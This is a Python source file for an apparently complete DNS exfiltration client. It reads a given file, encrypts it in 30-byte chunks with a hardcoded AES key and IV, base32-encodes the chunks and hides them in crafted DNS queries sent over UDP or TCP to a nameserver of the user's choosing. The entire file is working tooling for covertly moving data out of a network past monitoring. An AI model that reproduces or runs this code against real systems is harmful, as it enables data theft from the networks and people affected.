#!/usr/bin/python3 
 
# Author: "omroot" 
# omroot.io 
# LICENSE: GPLv3.0 


import sys
import time
import socket
import base64
import codecs
import argparse
import colorama
import binascii
from Crypto.Cipher import AES
from io import StringIO

# Global vars:
# Colors:
red   = colorama.Fore.RED
cyan  = colorama.Fore.CYAN
white = colorama.Fore.WHITE
yellow= colorama.Fore.YELLOW
reset = colorama.Fore.RESET

# A sample DNS packet we're using as a template for UDP requests.
HEADER_UDP = b"\x7b\x71\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
# Length of data.
LENGTH_UDP = b"\x3f"
# Data.
DATA_UDP   = b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
             b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
             b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
             b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x62"
# Rest of stuff here.
TRAILER_UDP = b"\x08\x6d\x79\x64\x6f\x6d\x61\x69\x6e\x03\x74\x6c\x64\x00\x00\x01\x00\x01"

# A sample DNS packet we're using as a template for TCP requests.
# Total length of the DNS request.
T_LENGTH_TCP = b"\x00\x75" 
HEADER_TCP   = b"\x57\x6f\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01"
# Length of data.
LENGTH_TCP   = b"\x3f"
# Data
DATA_TCP     = b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
               b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
               b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61" \
               b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
# Rest of stuff here.
TRAILER_TCP  = b"\x08\x6d\x79\x64\x6f\x6d\x61\x69\x6e\x03\x74\x6c\x64\x00\x00\x01\x00\x01" \
               b"\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x0c\x00\x0a\x00\x08\xf7" \
               b"\x01\x7f\x07\x24\x87\xdd\xe3"

class PKCS7Encoder(object):
    """
    https://gist.githubusercontent.com/chrix2/4171336/raw/a630d1cf9dbab7d01ee75ada5832fdeb3066e40d/pkcs7.py
    With some modifications.
    """

    def __init__(self, k=16):
        # Size of the block. 
        self.k = k

    def encode(self, text):
        """
        Pad an input string according to PKCS#7
        """

        l = len(text)
        output = StringIO()
        val = self.k - (l % self.k)
        for _ in range(val):
            output.write('%02x' % val)
        return text + binascii.unhexlify(output.getvalue())

def encrypt(data):
    """
    Encrypts data.
    Note that the IV and shared_key must match on client & server.

    NOTE: you might want to change both of them (shared_key, IV).
    """

    # A key to encrypt/decrypt data.
    shared_key = b"\xa1\xc0\x84\x21\xa3\x61\x91\xb3\x1a\xe4\xd2\xd4\xc6\xa2\x34\xb3" \
                 b"\x34\x10\x8f\x9a\x32\x85\xa5\x4d\x31\x48\x81\x39\x0b\x89\x6a\x23"
    # Initialization vector:
    IV = b"\xe3\x62\x72\x5c\xe2\x75\x24\x67\x8b\x4e\x54\x37\x07\xa1\xb9\x80"
    aes = AES.new(shared_key, AES.MODE_CBC, IV)
    aes.block_size = 128

    # Padding through the PKCS7 standard.
    enc_content = aes.encrypt(PKCS7Encoder().encode(data))
    cipher_text = base64.b32encode(enc_content)
    return cipher_text

def create_socket(ns, dns_port, TCP=False):
    if(TCP):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ns, dns_port))
    return s

def send_request(s, data):
    """
    Sends the actual DNS request to the DNS.
    """

    if(s.type == 1):
        # TCP
        length_TCP   = binascii.unhexlify(format(len(data), '02x').replace('0x', '').encode())
        t_length_TCP = binascii.unhexlify(format(len(HEADER_TCP+length_TCP+data+TRAILER_TCP), '04x'))
        s.sendall(t_length_TCP+HEADER_TCP+length_TCP+data+TRAILER_TCP)
        
    elif(s.type == 2):
        # UDP
        length_UDP = binascii.unhexlify(format(len(data), '02x').replace('0x', '').encode())
        s.sendall(HEADER_UDP+length_UDP+data+TRAILER_UDP)

def file_to_chunks(path):
    """
    A wrapper to encrypt data so that it can be sent
    to the DNS.
    """

    l = []
    try:
        with open(path, 'rb') as f:
            while (chunk := f.read(30)):
                l.append(encrypt(chunk).replace(b"=", b"-"))
        f.close()
    except IOError:
        print(f"{red}File is not accessible.{reset}")
        sys.exit(1)
    return l

def main():
    parser = argparse.ArgumentParser(description="A client to send files through DNS")
    requiredArgs = parser.add_argument_group('required arguments')
    requiredArgs.add_argument('-n', '--nameserver', action='store', type=str, dest='ns', 
            help='Name server to send DNS requests (data) to.', required=True)
    requiredArgs.add_argument('-f', '--file', action='store', type=str, dest='file',
            help='File path that you want to send.', required=True)
    parser.add_argument('-d', '--delay', action='store', type=float, default=0.05, dest='delay', 
            help='Delay between sending chunks. This is important for placing chunks in their correct order.')
    parser.add_argument('-p', '--port', action='store', type=int, default=53, dest='dns_port', 
            help='DNS port.')
    parser.add_argument('--tcp', action='store_true', dest='tcp', help='DNS through TCP.')

    args = parser.parse_args()

    print(f"{yellow}Sending {white}{args.file}{reset}{yellow} with a delay of {white}{args.delay}{reset}{reset}")

    chunks = file_to_chunks(args.file)
    s = create_socket(args.ns, args.dns_port, args.tcp) if args.tcp else create_socket(args.ns, args.dns_port, args.tcp)
    for chunk in chunks:
        send_request(s, chunk)
        time.sleep(args.delay)
        if args.tcp:
            s = create_socket(args.ns, args.dns_port, args.tcp)
    send_request(s, b"EOF")
    s.close()
    print(f"{cyan}The file should have been sent.{reset}")

if __name__ == "__main__":
    main()
